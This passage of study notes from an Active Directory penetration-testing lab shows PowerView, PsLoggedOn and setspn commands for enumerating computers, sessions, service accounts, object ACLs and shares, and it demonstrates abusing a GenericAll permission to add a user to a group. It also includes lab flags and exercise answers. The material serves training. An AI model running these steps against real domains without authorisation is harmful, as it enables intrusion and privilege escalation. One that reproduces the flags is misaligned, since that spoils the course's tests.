objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 12/3/2023 1:41:08 PM
objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1122
samaccountname                : CLIENT75$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : client75
accountexpires                : NEVER
whenchanged                   : 12/3/2023 9:41:38 PM
instancetype                  : 4
usncreated                    : 20731
objectguid                    : 85cff5a9-f98e-45a7-8676-ae12ddb76613
operatingsystem               : Windows 11 Enterprise
operatingsystemversion        : 10.0 (22000)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {WSMAN/client75, WSMAN/client75.corp.com, TERMSRV/CLIENT75,
                                TERMSRV/client75.corp.com...}
lastlogon                     : 12/3/2023 1:41:38 PM
iscriticalsystemobject        : False
usnchanged                    : 536756
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 9/5/2022 4:26:44 PM
primarygroupid                : 515
pwdlastset                    : 11/13/2023 5:42:14 AM
msds-supportedencryptiontypes : 28
name                          : client75
dnshostname                   : client75.corp.com

logoncount                    : 497
badpasswordtime               : 9/26/2023 5:18:57 AM
distinguishedname             : CN=client76,CN=Computers,DC=corp,DC=com
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 12/3/2023 1:41:08 PM
objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1129
samaccountname                : CLIENT76$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : client76
accountexpires                : NEVER
whenchanged                   : 12/3/2023 9:41:08 PM
instancetype                  : 4
usncreated                    : 30587
objectguid                    : 84dfef6e-f017-45b7-8d42-023fc43ba7ef
operatingsystem               : Windows 10 Pro
operatingsystemversion        : 10.0 (16299)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {TERMSRV/CLIENT76, TERMSRV/CLIENT76.corp.com,
                                RestrictedKrbHost/CLIENT76, HOST/CLIENT76...}
lastlogon                     : 12/3/2023 1:41:11 PM
iscriticalsystemobject        : False
usnchanged                    : 536718
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 9/13/2022 11:07:44 AM
primarygroupid                : 515
pwdlastset                    : 12/3/2023 1:41:08 PM
msds-supportedencryptiontypes : 28
name                          : client76
dnshostname                   : CLIENT76.corp.com
```

We'll search for operating system and hostname.
```powershell
PS C:\Tools> Get-NetComputer | select operatingsystem,dnshostname

operatingsystem              dnshostname
---------------              -----------
Windows Server 2022 Standard DC1.corp.com
Windows Server 2022 Standard web04.corp.com
Windows Server 2022 Standard FILES04.corp.com
Windows 11 Pro               client74.corp.com
Windows 11 Enterprise        client75.corp.com
Windows 10 Pro               CLIENT76.corp.com
```
- The output reveals 6 computers inthe domain.
 - 3 are servers.
  - 1 of which is a DC.

It's best to grab this info early in the assessment to determine the relative age of the systems and locate potentially weak targets.  According to the info we gathered so far the oldest OS is Win 10.  It appears we will be dealing with a web server and a file server that will require our attention at some point.

So far we have enumed a list of all objects in the domain as well as their attributes.  In the next section we will use this info to determine the relationships between various objects in search of attack vectors.

###### Labs

Start VM Group 1 and log in to CLIENT75 as stephanie. Repeat the PowerView enumeration steps as outlined in this section. What is the DistinguishedName for the WEB04 machine?
```powershell
PS C:\Tools> Get-NetComputer | select operatingsystem,dnshostname,distinguishedname

operatingsystem              dnshostname       distinguishedname
---------------              -----------       -----------------
Windows Server 2022 Standard DC1.corp.com      CN=DC1,OU=Domain Controllers,DC=corp,DC=com
Windows Server 2022 Standard web04.corp.com    CN=web04,CN=Computers,DC=corp,DC=com
Windows Server 2022 Standard FILES04.corp.com  CN=files04,CN=Computers,DC=corp,DC=com
Windows 11 Pro               client74.corp.com CN=client74,CN=Computers,DC=corp,DC=com
Windows 11 Enterprise        client75.corp.com CN=client75,CN=Computers,DC=corp,DC=com
Windows 10 Pro               CLIENT76.corp.com CN=client76,CN=Computers,DC=corp,DC=com
```

Continue enumerating the operating systems in VM Group 1. What is the exact operating system version for FILES04? Make sure to provide both the major and minor version number in the answer.
```powershell
PS C:\Tools> Get-NetComputer | select operatingsystem,operatingsystemversion,dnshostname

operatingsystem              operatingsystemversion dnshostname
---------------              ---------------------- -----------
Windows Server 2022 Standard 10.0 (20348)           DC1.corp.com
Windows Server 2022 Standard 10.0 (20348)           web04.corp.com
Windows Server 2022 Standard 10.0 (20348)           FILES04.corp.com
Windows 11 Pro               10.0 (22000)           client74.corp.com
Windows 11 Enterprise        10.0 (22000)           client75.corp.com
Windows 10 Pro               10.0 (16299)           CLIENT76.corp.com
```

Start VM Group 2 and log in to CLIENT75 as stephanie. Use PowerView to enumerate the operating systems in the modified corp.com domain to obtain the flag.
```powershell
PS C:\Users\stephanie> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\stephanie> cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-NetComputer | select operatingsystem,dnshostname

operatingsystem                      dnshostname
---------------                      -----------
Windows Server 2022 Standard         DC1.corp.com
Windows Server 2022 Standard         web04.corp.com
Windows Server 2022 Standard         FILES04.corp.com
Windows 11 Pro                       client74.corp.com
Windows 11 Enterprise                client75.corp.com
Windows 10 Pro                       CLIENT76.corp.com
OS{cdcf1b0cdbd7296287de5e0c5763854a}
```


##### Getting an Overview - Permissions and Logged on Users

Now that we have a clear list of computers, users, and groups in the domain we continue enum focusing on the relationships between as many objects as possible.  These relationships often play a key role during attack and our goal is to build a map of the domain to find attack vectors.

Example, when a user logs in to the domain their creds are cached in mem on the computer they logged in from.

If we can steal those creds we may be able to use them to auth as the domain user and potentially escalate our domain privs.

However during an AD assessment we may not always want to escalate privs right away.

It is more important to establish a good foothold and our goal is to maintain access.  If we are able to compromise other users with the same perms as the user we already have access to, this allows us to maintain our foothold.  Example, if the password is reset for the user we originally obtained access to or sys admin notices suspicious activity and disable the account, we would still have access to the domain via other users we compromised.

When it is time for PrivEsc we don't immediatly need domain admin because there may be other accounts that have higher privs than regular user even if they aren't part of Domain Admin group.  Service Accounts, which we will discuss later, are a good example of this.  Although they may not have the highest privs, they may have more perms than regular domain user, such as local admin privs on specific servers.

In addition an orgs most sensitive and important data may be stored in locations that do not require domain admin privs, a DB or file server for instance.  Due to this, domain admin privs should not always be the end goal during an assesment since we may be able to reach the "crown jewels" for an org via other users in the domain.

*Nevertheless, in our Challenge Labs the goal is to achieve domain administrator privileges.*

When an attacker improves access through multiple higher-level accounts to reach the goad, it is known as "chained compromise".

To find possible attack paths we need to learn more about our initial user and see what domain access they have.  We also need to find out where other users are logged in.

PowerView's `Find-LocalAdminAccess` command scans the network in an attempt to determine if our current user has admin perms on any computers in the domain.  The command relies on `OpenServiceW` [function](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicew), which connects to Service Control Manager (SCM) of the target machines.  The SCM maintains a DB of installed services and drivers on Win computers.  PowerView will attempt to open this DB with the SC_MANAGER_ALL_ACCESS access right, wich requires admin privs, and if successful PowerView will deem that our current user has admin privs on the target.

Run `Find-LocalAdminAccess` against `corp.com`.  The command supports params like `Computername` and `Credentials` but we will run it without params in this case since we are interested in enum all computers and we are already logged in as `stephanie`.  Essentially, we are spraying the env to find possible local admin access on computers under our current context.

*Depending on the size of the environment, it may take a few minutes for Find-LocalAdminAccess to finish.*

```powershell
PS C:\Users\stephanie> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\stephanie> cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Find-LocalAdminAccess
client74.corp.com
```
- User `stephanie` had admin privs on CLIENT74.

It is tempting to log into CLIENT74 and check perms, we should first zoom out and generalize.

Pentests can lead us in many different directions and while we should follow up on the many different paths, based on our interactions we should stick to our plan and maintain a disciplined approach.

Continue by visualizing how computers and users are connected to one another.  The first step is to obtain info such as which users are logged into with computers.

Historically, the two best Win APIs that may still achieve these goals are [NetWkstaUserEnum](https://learn.microsoft.com/en-us/windows/win32/api/lmwksta/nf-lmwksta-netwkstauserenum) and [NetSessionEnum](https://learn.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum).  The former requires admin privs while the later does not.  Win has undergone changes over the last few years, which may make the discovery of logged in user enum more difficult for us.

PowerView's `Get-NetSession` command users `NetWkstaUserEnum` and `NetSessionEnum` API under the hood.  Let's try to run it against some fo the machines in the domain to see if we can find any logged in users.
```powershell
PS C:\Users\stephanie> cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-NetSession -ComputerName files04
PS C:\Tools> Get-NetSession -ComputerName web04
```
- We received no output.
 - There may be no users logged into the machine.
  - Assure we aren't receiving error messages by adding `-Verbose`
```powershell
PS C:\Tools> Get-NetSession -ComputerName files04 -Verbose
VERBOSE: [Get-NetSession] Error: Access is denied
PS C:\Tools> Get-NetSession -ComputerName web04 -Verbose
VERBOSE: [Get-NetSession] Error: Access is denied
```
- It appears `NetSessionEnum` does not work in this case.
 - We are not allowed to run the query, likey due to perms.

We may have admin privs on CLIENT74 with `stephanie`, run it against the machine and inspect the results.
```powershell
PS C:\Tools> Get-NetSession -ComputerName client74


CName        : \\192.168.214.75
UserName     : stephanie
Time         : 0
IdleTime     : 0
ComputerName : client74
```
- Taking a closer look the output IP in CName doesn not match the IP address for CLIENT74.
 - It matches the IP of our current machine, CLIENT75.
 - We haven't spawned any sessions to 74 so something appears to be off.

IRL engagement, or even Challenge Labs, we might accept that enum sessions with PowerView does not work and try a different tool, but let's use this as a learning opportunity and take a deeper dive into the NetSessionEnum API to see why it does not work in this case.

According to NetSessionEnum docs there are five query levels: `0,1,2,10,502`.
- Level 0 only returns the name of the computer establishing the session.
- Level 1,2 return more info but require admin privs.
- Level 10,502 return info such as name of the computer and name of the user establishing the connection.

By default PowerView uses query level 10 with NetSessionEnum, which should return this info.

The perms required to enum sessions with `NetSessionEnum` are defined in the `SrvsvcSessionInfo` reg key located in the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity` hive.

We use the Win 11 machine we are currently logged in on to check the perms, it may have different perms than the other machines in the env, it may give us an idea of what is going on.

In order to view perms we use the PowerShell [Get-Acl](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.3) cmdlet to retrieve the perms for the object we define with the `-Path` flag and print them in our PowerShell prompt.
```powershell
PS C:\Tools> Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\
         LanmanServer\DefaultSecurity\
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Users Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122
         -3456934681 Allow  ReadKey
Audit  :
Sddl   : O:SYG:SYD:AI(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;
         ;;AC)(A;CIID;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-323
         2135806-4053264122-3456934681)
```
- `Access` reveals the groups and users that have either `FullControl` or `ReadKey`
 - They can read the `SrvsvcSessionInfo` key itself.
- Groups defined by sys do not allow NetSessionEnum to enum reg key from a remote standpoint.
 - BUILTIN.
 - NT AUTHORITY.
 - CREATOR OWNER.
 - APPLICATION PACKAGE AUTHORITY.
- The string in the end of the output is a `capability SID`
 - The MS docs refer to the exact SID in our output.
 - It is an unforgable token of authority that grants a Win component or a Universal Windows Application access to various resources.
  - However it will not allow remote access to the reg keys of interest.

In older Win versions, which MS does not specify, Authenticated Users were allowed to access the reg hive and obtain info from the `SrvsvcSessionInfo` key.  Following the least priv principle, regular domain users should not be able to access this info within the domain, likely part of the reason the perms for reg hive changed as well.  Due to perms, we can be certain NetSessionEnum will not be able to retrieve the info on default Win 11.

Now we can get a better sense of the OS version in use, using `Net-GetComputer` and include the `operatingsystemversion` attribute.
```powershell
PS C:\Tools> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion

dnshostname       operatingsystem              operatingsystemversion
-----------       ---------------              ----------------------
DC1.corp.com      Windows Server 2022 Standard 10.0 (20348)
web04.corp.com    Windows Server 2022 Standard 10.0 (20348)
FILES04.corp.com  Windows Server 2022 Standard 10.0 (20348)
client74.corp.com Windows 11 Pro               10.0 (22000)
client75.corp.com Windows 11 Enterprise        10.0 (22000)
CLIENT76.corp.com Windows 10 Pro               10.0 (16299)
```
- As we discovered earlier Win 10 is the oldest OS in the env.
 - Based on output it run version 16299.
  - Known as build 1709.

The MS docs are not clear when the change was made to the reg hive, but it appears to be around the release of this build.  It also affects Win servers since Server 2019 build 1809.  This creates an issue for us since we will be unable to use PowerView to build the domain map we had in mind.

Though `NetSessionEnum` does not work in this case, it's not uncommon to find older systems IRL so we should keep it in our toolkit.

Luckily there are other tools we can use, such as [PsLoggedOn](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon) app from the [SysInternals Suite](https://learn.microsoft.com/en-us/sysinternals/).  The docs state that `PsLoggedOn` will enumerate the reg keys under `HKEY_USERS` to retrieve the security identifiers (SID) of logged-in users and convert the SIDs to usernames.  `PsLoggedOn` will also use the NetSessionEnum API to see who is logged on to the computer via resource shares.

However, `PsLoggedOn` relies on the Remote Registry service to scan associated keys which limits it.  The Remote Registry service has not been enabled by default on Win workstations since Win 8, but sys admins may enable it for various admin tasks, backwards compatability, or for installing monitoring deploymnet tools, scripts, agents, etc.

It is also enabled by default on later Win Server OS systems (Server 2012 R2, 2016 (1607), 2019 (1809), Server 2022 (21H2)).  If enabled the service will stop after ten minutes of inactivity to save resources, but will re-enable with an auto trigger once we connect with `PsLoggedOn`.

With the theory out of the way let's try to run `PsLoggedOn` against the computers we attempted to enum earlier, starting with FILES04/WEB04.
```powershell
PS C:\Tools\PSTools> .\PsLoggedon.exe \\files04

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Users logged on locally:
     <unknown time>             CORP\jeff
Unable to query resource logons

PS C:\Tools\PSTools> .\PsLoggedon.exe \\web04

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

No one is logged on locally.
Unable to query resource logons
```
- We find that `jeff` is logged in on FILES04 with his domain user account.
 - We note this potential attack vector.
- We find no user logged in to WEB04.
 - This may be a false positive as we cannot be sure the Remote Registry service is running, but received no error messages suggesting accurate output, for now we must trust the results.

As we discovered earlier in this section we appear to have admin priv on CLIENT74 via `stephanie`, a high interest target, and we should enum session there as well.  For educational purposes we have enabled the Remote Registry service on CLIENT74.
```powershell
PS C:\Tools\PSTools> .\PsLoggedon.exe \\client74

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Users logged on locally:
     <unknown time>             CORP\jeffadmin

Users logged on via resource shares:
     12/4/2023 7:02:38 AM       CORP\stephanie
```
- `jeffadmin` has an open session on CLIENT74.
 - The output reveals very interesting info.
- If our enum is accurate we should be able to log in and attempt to steam the cred of `jeffadmin`
 - Tempting to do this immediately, but it is best practice to stay the course and continue enum.
 - Our goal is thorough analysis, not a quick win.
- Also not `stephanie` is logged on via resource shares.
 - Shown as `PsLoggedOn` also uses the `NetSessionEnum` API.
  - Which requires a logon to work in this case.
 - May also explain why we saw a logon earlier while using PowerView.

This concludes enum of our compromised user, including enum of active sessions within the domain.  Based on info we have gathered, we have a very interesting attack path that may lead to domain admin.

###### Labs

What registry key does NetSessionEnum rely on to discover logged on sessions?
```SrvsvcSessionInfo
```

Start VM Group 1 and log in to CLIENT75 as stephanie. Repeat the enumeration steps outlined in this section to find the logged on sessions. Which service must be enabled on the remote machine to make it possible for PsLoggedOn to enumerate sessions?
```
Remote Registry
```

Start VM Group 2 and log in to CLIENT75 as stephanie. Find out which new machine stephanie has administrative privileges on, then log in to that machine and obtain the flag from the Administrator Desktop.
```
### CLIENT75

PS C:\Users\stephanie> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\stephanie> cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Find-LocalAdminAccess
web04.corp.com
client74.corp.com

### WEB04 (PowerShell Admin Shell)

PS C:\> cd C:\Users\Administrator\Desktop\
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/4/2023  10:14 AM             78 proof.txt


PS C:\Users\Administrator\Desktop> cat .\proof.txt
OS{f0f39f8a31b598b49d0262d5826f783c}
```


##### Enumeration Through Service Principal Names

At this point we have obtained a good bit of info and are starting to see how things are connected together within the domain.  To complete our discussion on enum, we will shift our focus to [Service Accounts](https://learn.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-on-premises), which can also be members of high priv groups.

Apps must exec inthe context of an OS user.  If a user launches an app, the user account defines the context.  Service launched by the system itself run in the context of a Service Account.

Isolated apps ca use a set of predefined service accounts.
- [LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [LocalService](https://learn.microsoft.com/en-us/windows/win32/services/localservice-account)
- [NetworkService](https://learn.microsoft.com/en-us/windows/win32/services/networkservice-account)

For more complex apps a domain user account may be used, providing the context while maintaining access to domain resources.

When apps like Exchange, MS SQL, or IIS are integrated into AD a unique Service Principal Name (SPN) associates a service to a specific service account in AD.

*Managed Service Accounts, introduced with Windows Server 2008 R2, were designed for complex applications, which require tighter integration with Active Directory.*

*Larger applications like MS SQL and Microsoft Exchange often required server redundancy when running to guarantee availability, but Managed Service Accounts did not support this. To remedy this, Group Managed Service Accounts were introduced with Windows Server 2012, but this requires that domain controllers run Windows Server 2012 or higher. Because of this, some organizations may still rely on basic Service Accounts.*

We can obtain IPs and port numbers of apps running on services integrated with AD by enuming the SPNs in the domain, therefore we do not need to run a broad port scan.

Since the info is registered and stored in AD, it is present on the DC.  To obtain the data we query the DC for specific SPNs.

We have multiple options to enum the SPNs in the domain.  In this case we use `setspn.exe`, installed on Win by default.  We use `-L` to run against both servers and clients in the domain.

We could iterate through a list of domain users, but we previously dicsovered the `iis_service` user.  We will start with that one.
```powershell
PS C:\Tools> setspn.exe -L iis_service
Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
        HTTP/web04.corp.com
        HTTP/web04
        HTTP/web04.corp.com:80
```
- We find an SPN linked to the `iis_service` account.

We can also enum SPNs with PowerView by enuming all the accounts in the domain.  To obtain a clear list of SPNs, we can pipe the output into `select`, choosing `samaccountname` and `serviceprincipalname` attributes.
```powershell
PS C:\Tools> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname

samaccountname serviceprincipalname
-------------- --------------------
krbtgt         kadmin/changepw
iis_service    {HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}
```
- We will explore the `krbtgt` account in upcoming AD modules.
- The `serviceprincipalname` of `iis_service` is indicative of a web server.
	- `{HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}`

Let's attempt to resolve `web04.corp.com` with `nslookup`.
```powershell
PS C:\Tools> nslookup.exe web04.corp.com
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  192.168.227.70

Name:    web04.corp.com
Address:  192.168.227.72
```
- The hostname resolves to an internal IP.
 - If we browse there we find a website that requires login.

Since these accounts run services we can assume they have higher privs than regular domain user accounts.  For now we document the SPN linked to `iis_service`, which will be valuable in upcoming modules.


##### Enumerating Object Permissions

Next we will enum specific perms associated with AD objects.  The technical details of those perms are complex and beyond the scope of this module, but it is important that we discuss the basics.

Objects in AD can have a set of perms applied to them with multiple [Access Control Entries (ACE)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries), which make up the [Access Control List (ACL)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists).  Each ACE defines if access to an object is allowed or denied.

Example, a domain user attempts to access a domain share, which is an object.  The targeted object, the share in this case, will go through a validation check based on the ACL to determine if the user has perms to the share.  ACL validation involves two main steps.
- The user sends an access token.
 - Consists of user identity and permissions.
- Target object validates the token against the list of perms (ACL)
 - If the ACL allows the user to access the share, access is granted.
 - Otherwise request is denied.

AD includes numerous permission types which can be used to configure an ACE.  From the attacking standpoint, we are mainly interested in several key permission types.  Here is a short list of the interesting ones
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
- Other permissions are described in the [MS Docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks)

We can use `Get-ObjectAcl` to enum ACEs with PowerView, let's enum our own user to determine which ACEs are applied to it and filter on `-Identity`:
```powershell
PS C:\Tools> Get-ObjectAcl -Identity stephanie

...
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 4c164200-20c0-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 16
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None
...
```
- This may seem like an overwhemling amount of output, but we are primarily interested in:
 - ObjectSID.
 - ActiveDirectoryRights.
 - SecurityIdentifier.

The output lists two [Security Identifiers (SID)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers), unique object values in AD.  The first, in the ObjectSID prop, contains value
- `S-1-5-21-1987370270-658905905-1781884369-1104`
To make sense of the SID, we use PowerView's `Convert-SidToName` command to convert it to a domain object.
```powershell
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie
```
- The SID in the ObjectSID prop belongs to `stephanie` user (current)

The ActiveDirectoryRIghts prop describes the perms applied to the object.  To find out who has the ReadProperty perm, we convert the SecurityIdentifier value.
```powershell
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
CORP\RAS and IAS Servers
```
- The SID in SecurityIdentifier prop belongs to default AD group.
 - RAS and IAS Servers.

Taking this info together we see that the RAS and IAS Servers group has ReadProperty access rights to our user.  This is a common confiuration in AD and likely won't yield an attack vector, but we have used the exaple to make sense of the info we have obtained.

In general, we are interested in the `ActiveDirectoryRights` and `SecurityIdentifier` for each object we enumerate moving forward.

The highest access permissions we can have on an object is `GenericAll`.  There are many interesting ones as we discussed previously, but we will use `GenericAll` as an example.

We can continue to use `Get-ObjectAcl` and select only the props we are interested in.
- `ActiveDirectoryRights`
- `SecurityIdentifier`
While `ObjectSID` is nice to have, it is unnecessary when enuming specific objects in AD since it will only contain the SID for the object we are enuming.

We should enum all objects in the domain, but let's start with `Management Department` group.  We will check if any users have `GenericAll` permissions.

To create manageable output we use the PS `-eq` flag to filter the `ActiveDirectoryRights` prop to only display values that equal `GenericAll`.  Then we pipe the results into `select` and display only the `SecurityIdentifier` and `ActiveDirectoryRights` prop.
```powershell
PS C:\Tools> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
S-1-5-32-548                                             GenericAll
S-1-5-18                                                 GenericAll
S-1-5-21-1987370270-658905905-1781884369-519             GenericAll
```
- We find a total of 5 objects with `GenericAll` perms in `Management Department`

Convert the SIDs into names.
```powershell
PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
```
- The first belongs to `Domain Admins` group.
 - No surprise as Domain Admins have the highest privs in the domain.
  - It is interesting to find `stephanie` in that list.
  - Regular domain users should not have `GenericAll` so this may be a misconfig.

This finding indicates `stephanie` is a powerful account, which is significant.

While ehuming the Management Group, we find `jen` is its only member.  As an experiment to show the power of misconfig object perms, we will try to use out perms as `stephanie` to add ourselves to the group with `net.exe`.
```powershell
PS C:\Tools> net group "Management Department" stephanie /add /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.
```
- We should now be a member of the group.
- Verify with `Get-NetGroup`
```powershell
PS C:\Tools> net group "Management Department" stephanie /add /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.

PS C:\Tools> Get-NetGroup "Management Department" | select member

member
------
{CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
```
- We see `jen` is no longer the sole member of the group.
 - `stephanie` has been added.

Now that we have abused `GenericAll` perm, use it to clean up after ourselves.
```powershell
PS C:\Tools> net group "Management Department" stephanie /del /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.

PS C:\Tools> Get-NetGroup "Management Department" | select member

member
------
CN=jen,CN=Users,DC=corp,DC=com
```
- We see `jen` is once again the sole member of the group.

From the perspective of a sys admin, managing AD perms can be a tough task, especially in complex envs.  Weak perms, as we have seen here, are the go-to vectors for attackers since it can help us escalate privs in domain.

We enumed the Management Group object and leveraged `GenericAll` misconfig  to add ourselved to the group.

##### Enumerating Domain Shares

Now we shift our focus to domain shares.  Domain shares often contain critical info about the env, which we can use to our advantage.

We'll use PowerView's `Find-DomainShare` function to find the shares in the domain.  We could add the `-CheckShareAccess` flag, displaying only shares available to us, but we will skip this for now to return a full list.
```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Find-DomainShare

Name           Type Remark                 ComputerName
----           ---- ------                 ------------
ADMIN$   2147483648 Remote Admin           DC1.corp.com
C$       2147483648 Default share          DC1.corp.com
IPC$     2147483651 Remote IPC             DC1.corp.com
NETLOGON          0 Logon server share     DC1.corp.com
SYSVOL            0 Logon server share     DC1.corp.com
ADMIN$   2147483648 Remote Admin           web04.corp.com
backup            0                        web04.corp.com
C$       2147483648 Default share          web04.corp.com
IPC$     2147483651 Remote IPC             web04.corp.com
ADMIN$   2147483648 Remote Admin           FILES04.corp.com
C                 0                        FILES04.corp.com
C$       2147483648 Default share          FILES04.corp.com
docshare          0 Documentation purposes FILES04.corp.com
IPC$     2147483651 Remote IPC             FILES04.corp.com
Tools             0                        FILES04.corp.com
Users             0                        FILES04.corp.com
Windows           0                        FILES04.corp.com
ADMIN$   2147483648 Remote Admin           client74.corp.com
C$       2147483648 Default share          client74.corp.com
IPC$     2147483651 Remote IPC             client74.corp.com
ADMIN$   2147483648 Remote Admin           client75.corp.com
C$       2147483648 Default share          client75.corp.com
IPC$     2147483651 Remote IPC             client75.corp.com
sharing           0                        client75.corp.com
ADMIN$   2147483648 Remote Admin           CLIENT76.corp.com
C$       2147483648 Default share          CLIENT76.corp.com
IPC$     2147483651 Remote IPC             CLIENT76.corp.com
```
- Shares are from 3 different servers and a few clients.
 - Some of these are default shares.
 - We should investigate each for interesting info.

We will focus on [SYSVOL](https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx), which may include folder residing on the DC itself.  This share is generally used for domain policies and scripts.  the `SYSVOL` folder is mapped to `%SystemRoot%\SYSVOL\Sysvol\domain-name` by default on the DC and every domain user has access to it.
```powershell
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\


    Directory: \\dc1.corp.com\sysvol\corp.com


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:11 AM                Policies
d-----          9/2/2022   4:08 PM                scripts
```

In an assessment we should investigate every folder we discover in search of interesting items.  For now, let's examine the `Policies` folder.
```powershell
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Policies\


    Directory: \\dc1.corp.com\sysvol\corp.com\Policies


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
